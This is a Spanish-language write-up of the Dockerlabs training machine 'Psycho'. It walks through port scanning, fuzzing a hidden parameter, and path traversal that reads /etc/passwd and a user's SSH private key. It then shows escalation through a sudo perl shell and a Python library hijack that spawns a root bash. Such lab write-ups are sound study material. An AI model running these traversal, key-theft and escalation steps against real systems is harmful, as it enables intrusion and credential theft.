# Write-up: 

**Nombre de la m√°quina:** `Psycho` 
**Plataforma:** `Dockerlabs` 
**IP:** `172.17.0.2` 
**SO:** `Linux` 
**Dificultad:** `Muy F√°cil`

---

## 1. RECONOCIMIENTO

El objetivo de esta fase es identificar los puntos de entrada y servicios expuestos en la m√°quina v√≠ctima.

#### 1.1. Verificaci√≥n de Conectividad

Se lanza un `ping` para confirmar que la m√°quina est√° activa y obtener el TTL lo que puede darnos una primera pista sobre el sistema operativo.
	`ping 172.17.0.2`
Nos devuelve conectividad y un TTL=64 por lo que estamos ante una m√°quina Linux.
![](Imagenes/100.png)
#### 1.2. Escaneo de Puertos

Se realiza un escaneo con **Nmap** para descubrir puertos abiertos, los servicios que corren en ellos y sus versiones.

```
sudo nmap -p- -sV -sC -sS --min-rate 5000 --open -n -Pn 172.17.0.2 -oN port_scan.txt
```

**Puertos Descubiertos:**

| Puerto | Servicio | Versi√≥n       | Notas                    |
| ------ | -------- | ------------- | ------------------------ |
| 22     | ssh      | OpenSSH 9.6   | Necesitamos credenciales |
| 80     | http     | Apache 2.4.58 | Iniciaremos por aqu√≠     |


![](Imagenes/101.png)

Normalmente el acceso por el puerto 22 al servicio ssh requiere de credenciales. Ya sea usuario y contrase√±a o clave rsa. En este caso carecemos de informaci√≥n al respecto as√≠ que lo m√°s productivo es explorar el puerto :80

---

## 2. ENUMERACI√ìN

Una vez identificados los servicios, se procede a investigarlos en profundidad en busca de vulnerabilidades o informaci√≥n √∫til.

### Puerto 80 ( HTTP)

#### Enumeraci√≥n Manual:

- **Navegaci√≥n web:** Se visita el sitio en `http://172.17.0.2.
    Tenemos una p√°gina de bienvenida
    ![](Imagenes/102.png)
- **An√°lisis del c√≥digo fuente:** Se revisa el HTML en busca de comentarios, rutas o scripts ocultos.
    No encontramos nada relevante
	![](Imagenes/103.png)
- **Archivos comunes:** Se buscan manualmente archivos y directorios comunes:
	- `/robots.txt`-->X
	- `/sitemap.xml`--> X
	- `/login`--> X
	- `/admin`--> X
	- `/panel`--> X
	- `/user`--> X
	- `/panel`--> X
	- `backup`--> X
	- `uploads`--> X
	- `test, etc.`--> X
    
    No encontramos nada
#### Enumeraci√≥n Autom√°tica:
- Lanzamos la herrmaienta `whatweb` para que nos de informaci√≥n sobre la aplicaci√≥n web. 
```
whatweb 172.17.0.2`
```

![](Imagenes/126.png)
	No nos aporta demasiado en este punto


- Lanzamos la herramienta de enumeraci√≥n `gobuster` para buscar directorios ocultos y extensiones .php,.txt y .html 

```
gobuster dir -u http://172.17.0.2/ -w /urs/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -k
```
![](Imagenes/104.png)

**Hallazgos:**
Nos devuelve una ruta llamativa `/index.php`

- Lanzamos la herramienta `wfuzz` que permite realizar ataques de `fuzzing` sobre URLs con el objetivo de descubrir par√°metros GET ocultos en la URL `http://172.17.0.2/index.php`

```
 wfuzz -c -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hl 62
```

![](Imagenes/105.png)

Interponiendo este par√°metro `secret` en la ruta hac√≠a /etc/passwd podemos acceder al directorio donde se almacenan los nombres de los usuarios explotando la vulnerabilidad `path traversal` 
![](Imagenes/106.png)

![](Imagenes/107.png)

- **Hallazgos clave**
	- Usuarios encontrados: `vaxei` y `luisillo`

Utilizando la misma vulnerabilidad llegamos hasta la clave `rsa` del usuario `vaxei` que copiamos y guardamos en un archivo `nano` dentro de nuestro directorio de trabajo. Cambiando los permisos de este archivo `600`

`http://172.17.0.2/index.php?secret=../../../home/vaxei/.ssh/id_rsa`

![](Imagenes/108.png)

![](Imagenes/109.png)

```
chmod 600 id_sra
```
![](Imagenes/110.png)
### 22(SSH)

Si recordamos para acceder al servicio que corre en el puerto :22, el servicio `ssh`, y hemos podido encontrar la `id_rsa` del usuario `vaxei` por lo que no es necesario buscar password. 

```
ssh -i id_rsa vaxei@172.17.0.2
```
---

## 3. EXPLOTACI√ìN

### 3.1 Acceso inicial:

Con las credenciales descubiertas `id_rsa`  nos conectamos al servicio ssh:
```
	ssh -i id_rsa vaxei@172.17.0.2
```

![](Imagenes/112.png)



---

## 4. ESCALADA DE PRIVILEGIOS

Una vez dentro, el objetivo es elevar los privilegios del usuario actual al de `root`.

### 4.1. Enumeraci√≥n Interna

Se realizan comprobaciones b√°sicas y se buscan posibles vectores de escalada.

#### Comprobaciones del sistema:

¬øQu√© usuario somos? `whoami`

![](Imagenes/113.png)

¬øA qu√© grupo pertenezco? `id`

![](Imagenes/114.png)
 
¬øQu√© usuario hay en el sistema?
¬øQu√© usuario tienen una shell asignada?
En este caso esto ya lo descubrimos en pasos previos. 

Revisamos los directorios de los usuarios:
`Luisillo`:

![](Imagenes/115.png)

`Ubuntu`:

![](Imagenes/116.png)

`Vaxei`:

![](Imagenes/117.png)
- Hallazgo:
	- Archivo. `file.txt`. No parece relevante

	![](Imagenes/118.png)
	

Una buena pr√°ctica ser√≠a revisar los comandos utilizados por los usuarios en el `history`
#### B√∫squeda del Vector de Escalada:

- **Permisos Sudo:** ¬øQu√© comandos podemos ejecutar como otro usuario (o `root`)?
    ```
    sudo -l
    ```
     vemos que el usuario `vaxei` tiene permisos para ejecutar `perl` como  el usuario  `luisillo`. 
    ![](Imagenes/119.png)
	Hacemos una b√∫squeda en Gtfobins:
	https://gtfobins.github.io/gtfobins/perl/#sudo
	
![](Imagenes/120.png)
	Y encontramos un c√≥digo para rotar hasta `luisillo`
```
	sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'
```

![](Imagenes/121.png)
- Estabilizamos la TTY para hacerla seminteractiva:
	- `script /dev/null -c bash`
	  
- Siendo el usuario `luisillo` comprobamos de nuevo los **Permisos Sudo:** ¬øQu√© comandos podemos ejecutar como otro usuario (o `root`)?
    ```
    sudo -l
	```
	![](Imagenes/122.png)
	
	Vemos que podemos ejecutar como `sudo` `python3` en `/opt/paw.py`


### 4.2. Explotaci√≥n y Escalada a Root

Se ejecuta la t√©cnica para obtener una shell como `root`.

Durante el an√°lisis del script `/opt/paw.py`, identificamos que importa 4 librer√≠as de Python:
`subprocess`,
`os`
`sys`
`time`

Ninguna especifica rutas absolutas. Esto nos permite explotar una vulnerabilidad conocida como **Python Library Hijacking**.

Esta t√©cnica aprovecha el orden de b√∫squeda de m√≥dulos de Pyhton.
Si colocamos  un archivo con el mismo nombre de una librer√≠a importada  `subprocess.py` en el mismo directorio del script(`/opt`), Phyton lo cargar√° antes .

Al ejecutarse el script como `root`, nuestro c√≥digo malicioso cargue primero por el int√©rprete de Python podremos ejecutar c√≥digo arbitrario con privilegios de administrador. 

![](Imagenes/123.png)

- Desarrollo de la t√©cinca:
	- Creamos un archivo nano con el nombre `subprocess.py` en el directorio `/opt` e incluimos en √©l  c√≥digo maliciosos para que nos proporcione una `shell` cuando sea importando.
	  ![](Imagenes/124.png)
```
import os 
os.system("/bin/bash")
```


	-  Ejecutamos el script como root
	
```
 sudo /usr/bin/python3 /opt/paw.py
      
```
![](Imagenes/125.png)

SOMOS ROOT üöÄ
